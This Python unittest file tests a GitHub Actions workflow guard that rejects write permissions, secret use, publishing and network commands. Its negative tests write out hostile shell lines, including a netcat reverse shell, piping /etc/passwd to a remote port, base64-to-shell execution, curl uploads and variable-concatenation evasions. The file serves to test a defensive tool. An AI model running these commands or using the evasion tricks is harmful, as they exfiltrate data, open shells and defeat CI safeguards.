"""Tests for scripts/release_rehearsal/workflow_guard.py (issue #9)."""

import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))

from scripts.release_rehearsal import workflow_guard as wg

GOOD_WORKFLOW = """\
name: Release Rehearsal
on:
  pull_request:
    branches: [ "master" ]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  release-rehearsal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - run: make release-check
"""


class GoodWorkflowTests(unittest.TestCase):
    def test_no_violations(self):
        self.assertEqual(wg.validate_workflow_text(GOOD_WORKFLOW), [])

    def test_immutable_sha_checkout_ref_accepted(self):
        text = GOOD_WORKFLOW.replace(
            "actions/checkout@v7", "actions/checkout@" + "a" * 40
        )
        self.assertEqual(wg.validate_workflow_text(text), [])


class TriggerViolationTests(unittest.TestCase):
    def test_push_trigger_rejected(self):
        text = GOOD_WORKFLOW.replace(
            'on:\n  pull_request:\n    branches: [ "master" ]\n  workflow_dispatch: {}',
            'on:\n  push:\n    branches: [ "master" ]\n  workflow_dispatch: {}',
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("disallowed trigger" in v for v in violations))


class PermissionViolationTests(unittest.TestCase):
    def test_missing_top_level_permissions(self):
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read\n\n", "")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("permissions" in v for v in violations))

    def test_write_permission_rejected(self):
        text = GOOD_WORKFLOW.replace("contents: read", "contents: write")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write" in v for v in violations))

    def test_contents_write_anywhere_rejected(self):
        text = GOOD_WORKFLOW + "\n# contents: write (job override attempt)\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))


class CheckoutViolationTests(unittest.TestCase):
    def test_unpinned_checkout_ref_rejected(self):
        text = GOOD_WORKFLOW.replace("actions/checkout@v7", "actions/checkout@main")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("not an accepted version" in v for v in violations))

    def test_missing_persist_credentials_false_rejected(self):
        text = GOOD_WORKFLOW.replace("          persist-credentials: false\n", "")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("persist-credentials" in v for v in violations))


class ForbiddenSubstringTests(unittest.TestCase):
    def test_upload_artifact_rejected(self):
        text = GOOD_WORKFLOW + "\n      - uses: actions/upload-artifact@v4\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload-artifact" in v for v in violations))

    def test_gh_release_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: gh release create v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh release" in v for v in violations))

    def test_secrets_usage_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: echo ${{ secrets.TOKEN }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets." in v for v in violations))

    def test_git_tag_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: git tag v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git tag" in v for v in violations))

    def test_environment_rejected(self):
        text = GOOD_WORKFLOW + "\n    environment: production\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("environment:" in v for v in violations))


class RepositoryStateTests(unittest.TestCase):
    def test_real_release_rehearsal_workflow_is_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])

    def test_no_release_publish_workflow_exists(self):
        publish_path = ROOT / ".github" / "workflows" / "release-publish.yml"
        self.assertFalse(publish_path.exists())


# --- issue #9 verifier remediation: adversarial verifier-probe tests -------
# Every probe below encodes one specific evasion/escalation class the
# independent verifier's own findings called out by name. Each is a
# targeted mutation of GOOD_WORKFLOW (or a minimal standalone snippet),
# asserted to be REJECTED (or, for the final class, a realistic dynamic-
# summary workflow asserted to remain CLEAN).

class JobAndNestedPermissionEscalationTests(unittest.TestCase):
    def test_job_level_contents_write_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "  release-rehearsal:\n    runs-on: ubuntu-latest",
            "  release-rehearsal:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_nested_step_level_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      permissions:\n        contents: write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_deeply_indented_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "                        contents:      write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_quoted_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents: 'write'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_double_quoted_contents_write_rejected(self):
        text = GOOD_WORKFLOW + '      contents: "write"\n'
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_no_space_after_colon_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents:write\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))

    def test_tab_whitespace_contents_write_rejected(self):
        text = GOOD_WORKFLOW + "      contents:\twrite\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("contents: write" in v for v in violations))


class AnyScopeWritePermissionTests(unittest.TestCase):
    """issue #9 fresh-review remediation: a workflow permissions guard
    must reject *any* permission scope with value 'write', not merely
    'contents: write'. One adversarial probe per reproduced scope, plus
    inline/flow mappings, quoted keys/values, odd indentation/case, and a
    scope this module's authors have never heard of."""

    def _scope_write_rejected(self, snippet: str) -> None:
        text = GOOD_WORKFLOW + "\n" + snippet + "\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(
            any("write" in v.lower() for v in violations),
            f"expected a write-scope violation for {snippet!r}, got {violations!r}",
        )

    def test_id_token_write_job_level_rejected(self):
        self._scope_write_rejected("      id-token: write")

    def test_packages_write_rejected(self):
        self._scope_write_rejected("      packages: write")

    def test_pull_requests_write_rejected(self):
        self._scope_write_rejected("      pull-requests: write")

    def test_issues_write_rejected(self):
        self._scope_write_rejected("      issues: write")

    def test_actions_write_rejected(self):
        self._scope_write_rejected("      actions: write")

    def test_checks_write_rejected(self):
        self._scope_write_rejected("      checks: write")

    def test_deployments_write_rejected(self):
        self._scope_write_rejected("      deployments: write")

    def test_statuses_write_rejected(self):
        self._scope_write_rejected("      statuses: write")

    def test_future_unknown_scope_write_rejected(self):
        """A scope this module's authors have never heard of must still
        be rejected -- this is a generalized rule, never a fixed
        enumeration of "known" scope names (see
        `_DANGEROUS_ACTION_NAME_SUBSTRINGS`'s analogous design for
        `uses:` action names)."""
        self._scope_write_rejected("      something-new: write")

    def test_inline_flow_mapping_write_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "permissions:\n  contents: read",
            "permissions: {contents: read, id-token: write}",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write" in v for v in violations))

    def test_inline_flow_mapping_with_unknown_scope_rejected(self):
        text = GOOD_WORKFLOW + "\n      permissions: {contents: read, something-new: write}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write" in v for v in violations))

    def test_quoted_scope_key_write_rejected(self):
        self._scope_write_rejected('      "id-token": write')

    def test_single_quoted_scope_key_write_rejected(self):
        self._scope_write_rejected("      'id-token': write")

    def test_quoted_write_value_rejected(self):
        self._scope_write_rejected('      id-token: "write"')

    def test_single_quoted_write_value_rejected(self):
        self._scope_write_rejected("      id-token: 'write'")

    def test_uppercase_scope_and_value_rejected(self):
        self._scope_write_rejected("      ID-TOKEN: WRITE")

    def test_mixed_case_scope_and_value_rejected(self):
        self._scope_write_rejected("      Id-Token: Write")

    def test_no_space_after_colon_rejected(self):
        self._scope_write_rejected("      id-token:write")

    def test_extra_spacing_around_colon_rejected(self):
        self._scope_write_rejected("      id-token   :    write")

    def test_odd_deep_indentation_rejected(self):
        self._scope_write_rejected("                                id-token: write")

    def test_write_all_shorthand_for_unknown_scope_rejected(self):
        self._scope_write_rejected("      something-new: write-all")

    def test_legitimate_workflow_with_only_top_level_contents_read_remains_accepted(self):
        """Hardening this check must never produce a false positive
        against the real, legitimate, read-only workflow shape."""
        self.assertEqual(wg.validate_workflow_text(GOOD_WORKFLOW), [])

    def test_real_workflow_file_has_no_write_scope_anywhere(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.check_no_write_anywhere(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


class ShorthandPermissionTests(unittest.TestCase):
    def test_scalar_write_all_shorthand_rejected(self):
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read", "permissions: write-all")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write-all" in v or "does not declare" in v for v in violations))

    def test_job_level_write_all_shorthand_rejected(self):
        text = GOOD_WORKFLOW.replace(
            "  release-rehearsal:\n    runs-on: ubuntu-latest",
            "  release-rehearsal:\n    runs-on: ubuntu-latest\n    permissions: write-all",
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("write-all" in v for v in violations))

    def test_read_all_shorthand_is_conservatively_rejected(self):
        """This checker requires the explicit, unambiguous
        'contents: read' mapping block form -- a scalar 'read-all'
        shorthand (even though semantically safe) is conservatively
        rejected (as an unrecognized/missing top-level permissions
        block) rather than specially recognized, per this module's
        fail-closed-on-ambiguity design."""
        text = GOOD_WORKFLOW.replace("permissions:\n  contents: read", "permissions: read-all")
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("permissions" in v for v in violations))


class TokenAndSecretsInterpolationTests(unittest.TestCase):
    def test_github_token_interpolation_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ github.token }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("github.token" in v for v in violations))

    def test_github_token_case_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ GitHub.Token }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("github.token" in v.lower() for v in violations))

    def test_explicit_github_token_env_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: gh api /rate_limit\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets." in v or "gh_token" in v.lower() for v in violations))

    def test_secrets_case_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo ${{ Secrets.TOKEN }}\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("secrets" in v.lower() for v in violations))


class CommandIndirectionAndEvasionTests(unittest.TestCase):
    """Command-continuation/variable/subshell/eval/base64/'sh -c' evasion
    probes -- issue #9 verifier remediation."""

    def test_curl_rejected(self):
        text = GOOD_WORKFLOW + "      - run: curl https://example.invalid/upload -d @out.bin\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("curl" in v for v in violations))

    def test_wget_rejected(self):
        text = GOOD_WORKFLOW + "      - run: wget https://example.invalid/payload\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("wget" in v for v in violations))

    def test_curl_split_across_continuation_line_rejected(self):
        """A dangerous command split across a shell line-continuation
        (trailing backslash) must not evade detection just because the
        literal substring "curl" is not on the same physical line as the
        rest of the command."""
        text = GOOD_WORKFLOW + "      - run: |\n          cu\\\nrl https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        # "cu\\\nrl" normalizes to "curl" once the continuation is collapsed.
        self.assertTrue(any("curl" in v for v in violations))

    def test_curl_split_with_equally_indented_continuation_rejected(self):
        """Issue #9 fresh-review finding: the *realistic* shape of a
        dangerous split inside a YAML `run: |` block scalar is not a
        zero-indent continuation line -- it is a continuation line
        indented to line up with its sibling script lines (exactly what
        an author, or an adversary imitating an author, would actually
        write, and exactly what YAML's block-scalar dedent + POSIX
        shell backslash-newline splicing together turn into a single
        joined `curl` command with no separator at all). A normalizer
        that only strips the backslash+newline and leaves the
        continuation line's leading indentation in place would still
        see two separate whitespace-separated words ("cu" and "rl ...")
        and miss this entirely."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          cu\\\n"
            + "          rl https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("curl" in v for v in violations), violations)

    def test_gh_release_split_with_equally_indented_continuation_rejected(self):
        """Same fresh-review finding, for the `gh release` mutating-CLI
        pattern specifically: `gh rel\\` + an equally-indented `ease
        create ...` continuation line must normalize to the single,
        dangerous `gh release create ...` invocation, not to
        `gh rel        ease create ...` (two harmless-looking words)."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          gh rel\\\n"
            + "          ease create v1.0.0\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh release" in v.lower() for v in violations), violations)

    def test_git_push_split_with_equally_indented_continuation_rejected(self):
        """Same fresh-review finding, for a ref-mutating `git push`
        command split as `git pu\\` + an equally-indented `sh
        origin --tags` continuation line."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          git pu\\\n"
            + "          sh origin --tags\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v.lower() for v in violations), violations)

    def test_curl_split_with_equally_indented_crlf_continuation_rejected(self):
        """The same equally-indented mid-token continuation, but using
        CRLF line endings (as a workflow file checked out on/authored
        with Windows-style line endings would have), must be handled
        identically."""
        text = (
            GOOD_WORKFLOW.replace("\n", "\r\n")
            + "      - run: |\r\n"
            + "          cu\\\r\n"
            + "          rl https://example.invalid\r\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("curl" in v for v in violations), violations)

    def test_eval_rejected(self):
        text = GOOD_WORKFLOW + "      - run: eval \"$SOME_VAR\"\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("eval" in v for v in violations))

    def test_base64_decode_pipe_to_shell_rejected(self):
        text = GOOD_WORKFLOW + "      - run: echo $PAYLOAD | base64 -d | sh\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("base64" in v for v in violations))

    def test_sh_dash_c_rejected(self):
        text = GOOD_WORKFLOW + "      - run: sh -c 'echo hi'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("sh -c" in v for v in violations))

    def test_bash_dash_c_rejected(self):
        text = GOOD_WORKFLOW + "      - run: bash -c 'echo hi'\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("bash -c" in v for v in violations))

    def test_mutating_gh_api_post_rejected(self):
        text = GOOD_WORKFLOW + "      - run: gh api -X POST /repos/x/y/releases\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh api" in v for v in violations))

    def test_mutating_gh_api_method_flag_variant_rejected(self):
        text = GOOD_WORKFLOW + "      - run: gh api --method POST /repos/x/y/releases\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("gh api" in v for v in violations))

    def test_read_only_gh_api_get_is_not_rejected_by_the_mutating_rule(self):
        """A plain read-only 'gh api' call (no explicit mutating method)
        must not be flagged by the *mutating-gh-api* rule specifically --
        this module does not blanket-forbid all 'gh api' usage."""
        text = "gh api /rate_limit"
        for pattern, label in wg._COMPILED_FORBIDDEN_PATTERNS:
            if "mutating" in label:
                self.assertIsNone(pattern.search(text))


class NetworkAndUploadActionTests(unittest.TestCase):
    def test_disguised_case_variant_upload_artifact_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: Actions/Upload-Artifact@v4\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload" in v.lower() for v in violations))

    def test_unlisted_upload_action_rejected_by_generalized_heuristic(self):
        """An upload action this module has never explicitly enumerated
        (a fork, or a differently-named third-party action) must still
        be caught by the generalized 'uses:' name heuristic."""
        text = GOOD_WORKFLOW + "      - uses: some-fork/totally-unheard-of-upload-thing@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("upload" in v.lower() for v in violations))

    def test_publish_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: pypa/gh-action-pypi-publish@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("publish" in v.lower() for v in violations))

    def test_deploy_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: peaceiris/actions-gh-deploy@v3\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("deploy" in v.lower() for v in violations))

    def test_release_action_rejected(self):
        text = GOOD_WORKFLOW + "      - uses: ncipollo/release-action@v1\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("release" in v.lower() for v in violations))


class RefMutationTests(unittest.TestCase):
    def test_git_push_without_tags_flag_rejected(self):
        text = GOOD_WORKFLOW + "      - run: git push origin HEAD:refs/heads/gh-pages\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v for v in violations))

    def test_git_push_tags_rejected(self):
        text = GOOD_WORKFLOW + "      - run: git push --tags\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git push" in v for v in violations))

    def test_git_tag_rejected_case_insensitive(self):
        text = GOOD_WORKFLOW + "      - run: Git Tag v1.0.0\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("git tag" in v.lower() for v in violations))


class ValidDynamicSummaryWorkflowTests(unittest.TestCase):
    """A realistic, valid workflow using stdlib-JSON-driven dynamic
    summary generation (issue #9 item 7) must remain completely clean --
    hardening the guard must never produce a false positive against the
    actual, legitimate shape this repository's own workflow uses."""

    DYNAMIC_SUMMARY_WORKFLOW = """\
name: Release Rehearsal
on:
  pull_request:
    branches: [ "master" ]
  workflow_dispatch: {}

permissions:
  contents: read

jobs:
  release-rehearsal:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
        with:
          persist-credentials: false
      - name: Run release eligibility check
        run: make release-check
      - name: Render dynamic job summary from canonical JSON
        if: always()
        run: python3 -m scripts.release_rehearsal.cli check >> "$GITHUB_STEP_SUMMARY"
"""

    def test_valid_dynamic_summary_workflow_has_no_violations(self):
        violations = wg.validate_workflow_text(self.DYNAMIC_SUMMARY_WORKFLOW)
        self.assertEqual(violations, [])


# --- issue #9 residual-hardening: fresh-verifier-reproduced gaps -----------
# Every probe below encodes one of the four concrete residual gaps a
# fresh, independent verifier reproduced (bare `nc`, character-level
# shell-variable command assembly, npm/yarn/pnpm publish, docker
# push/login), plus negative controls proving the real workflow and
# ordinary, safe shell idioms remain completely clean.

class BareNetcatTests(unittest.TestCase):
    """A fresh, independent verifier reproduced a bare `nc host port`
    invocation (no leading `-` flag at all) surviving the previous
    dash-flag-only pattern (which required a `-` immediately after `nc`)."""

    def test_bare_nc_invocation_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: nc example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_bare_nc_with_redirection_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: nc example.invalid 4444 < /etc/passwd\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_flagged_nc_invocation_still_rejected(self):
        """Pre-existing coverage, retained: a flagged invocation must
        remain rejected too -- never weakened by the bare-invocation
        fix."""
        text = GOOD_WORKFLOW + "\n      - run: nc -e /bin/sh example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_nc_case_insensitive_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: NC example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v.lower() for v in violations), violations)

    def test_nc_extra_spacing_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: nc    example.invalid   4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("'nc'" in v for v in violations), violations)

    def test_ncat_still_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: ncat example.invalid 4444\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("ncat" in v for v in violations), violations)

    def test_nc_substring_inside_other_identifiers_not_falsely_rejected(self):
        """`\\bnc\\b` must not fire merely because "nc" appears glued
        inside a larger, unrelated word -- the exact substring false
        positive issue #9 requires this to avoid."""
        text = GOOD_WORKFLOW + "\n      - run: echo sync async func runc concurrency finance\n"
        violations = wg.validate_workflow_text(text)
        self.assertFalse(any("'nc'" in v for v in violations), violations)


class PackageAndContainerRegistryPublishTests(unittest.TestCase):
    """Package-registry publish and container-registry push/login
    commands, reproduced by a fresh, independent verifier as
    unrejected."""

    def test_npm_publish_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: npm publish\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("npm publish" in v.lower() for v in violations), violations)

    def test_npm_publish_case_insensitive_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: Npm Publish\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("npm publish" in v.lower() for v in violations), violations)

    def test_yarn_publish_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: yarn publish --non-interactive\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("yarn publish" in v.lower() for v in violations), violations)

    def test_pnpm_publish_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: pnpm publish --no-git-checks\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("pnpm publish" in v.lower() for v in violations), violations)

    def test_docker_push_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: docker push example.invalid/image:latest\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker push" in v.lower() for v in violations), violations)

    def test_docker_image_push_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: docker image push example.invalid/image:latest\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker push" in v.lower() for v in violations), violations)

    def test_docker_login_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: docker login -u user -p pass example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker login" in v.lower() for v in violations), violations)

    def test_docker_login_case_insensitive_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: Docker Login example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("docker login" in v.lower() for v in violations), violations)

    def test_non_publishing_commands_not_rejected_by_the_publish_login_rules(self):
        """A plain, non-publishing npm/yarn/pnpm/docker command must not
        be flagged by these publish/login-specific rules."""
        text = "npm install\nyarn add left-pad\npnpm install\ndocker build -t x .\ndocker pull x\n"
        for pattern, label in wg._COMPILED_FORBIDDEN_PATTERNS:
            if "publish" in label or "docker login" in label:
                self.assertIsNone(pattern.search(text), (label, pattern.pattern))


class VariableCommandAssemblyTests(unittest.TestCase):
    """A fresh, independent verifier reproduced a dangerous command name
    assembled at runtime from concatenated shell variable expansions in
    command position (`X=cur; Y=l; $X$Y ...`), evading every literal-
    substring `FORBIDDEN_PATTERNS` check above since the literal command
    name never appears anywhere in the workflow text."""

    def test_literal_issue_example_bare_concatenation_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: X=cur; Y=l; $X$Y https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_braced_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur\n"
            + "          Y=l\n"
            + "          ${X}${Y} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_mixed_brace_and_bare_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur\n"
            + "          Y=l\n"
            + "          $X${Y} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_three_fragment_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=c\n"
            + "          Y=u\n"
            + "          Z=rl\n"
            + "          $X$Y$Z https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_uppercase_and_extra_spacing_variant_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: X=CUR;    Y=L;   $X$Y https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_concatenation_split_across_a_line_continuation_rejected(self):
        """The concatenation must still be detected once a shell
        line-continuation splitting it across two YAML lines has
        already been collapsed by `_normalize_for_scanning`."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          X=cur; Y=l; $X\\\n"
            + "          $Y https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_crlf_concatenation_rejected(self):
        text = (
            GOOD_WORKFLOW.replace("\n", "\r\n")
            + "      - run: |\r\n"
            + "          X=cur; Y=l; $X$Y https://example.invalid\r\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("concatenating 2+ shell variable" in v for v in violations), violations)

    def test_direct_variable_command_invocation_rejected(self):
        """A single variable, assigned a full literal command name and
        then invoked directly (no fragment assembly needed), is the
        'analogous direct variable command invocation' issue #9 also
        requires rejected."""
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          CMD=curl\n"
            + "          $CMD https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_direct_variable_command_invocation_braced_rejected(self):
        text = (
            GOOD_WORKFLOW
            + "      - run: |\n"
            + "          CMD=curl\n"
            + "          ${CMD} https://example.invalid\n"
        )
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    def test_direct_variable_command_invocation_on_one_line_rejected(self):
        text = GOOD_WORKFLOW + "\n      - run: CMD=curl; $CMD https://example.invalid\n"
        violations = wg.validate_workflow_text(text)
        self.assertTrue(any("locally assigned a literal value" in v for v in violations), violations)

    # --- negative controls: must never break the real, legitimate shape ---

    def test_safe_dynamic_summary_redirection_not_flagged(self):
        text = (
            GOOD_WORKFLOW
            + '      - run: python3 -m scripts.release_rehearsal.cli summary >> "$GITHUB_STEP_SUMMARY"\n'
        )
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_ordinary_non_command_variable_interpolation_not_flagged(self):
        """Two variables concatenated purely as *displayed data* --
        never in command position -- must not be flagged: this is the
        'ordinary non-command data interpolation' issue #9 requires to
        keep working."""
        text = GOOD_WORKFLOW + '\n      - run: echo "combined=$A$B"\n'
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_env_prefixed_real_command_not_misclassified_as_assignment(self):
        """The common, legitimate `FOO=bar some-command args` inline-
        env-var-prefix idiom must not itself be (mis)treated as a 'pure'
        local assignment that would then make an unrelated later
        command invocation of some other, differently-named variable
        suspicious."""
        text = GOOD_WORKFLOW + "\n      - run: FOO=bar make release-check\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_single_never_locally_assigned_variable_command_not_flagged(self):
        """A single `$VAR` used directly as a command, when `VAR` was
        never locally assigned anywhere in this same script (e.g. an
        inherited/ambient environment variable), is not, by itself,
        high-confidence evidence of evasion -- only a *locally assigned*
        variable later invoked as a command is."""
        text = GOOD_WORKFLOW + "\n      - run: $SHELL --version\n"
        violations = wg.validate_workflow_text(text)
        self.assertEqual(violations, [])

    def test_real_workflow_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.check_variable_command_assembly(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])

    def test_real_workflow_full_validation_remains_clean(self):
        path = ROOT / ".github" / "workflows" / "release-rehearsal.yml"
        violations = wg.validate_workflow_text(path.read_text(encoding="utf-8"))
        self.assertEqual(violations, [])


if __name__ == "__main__":
    unittest.main()
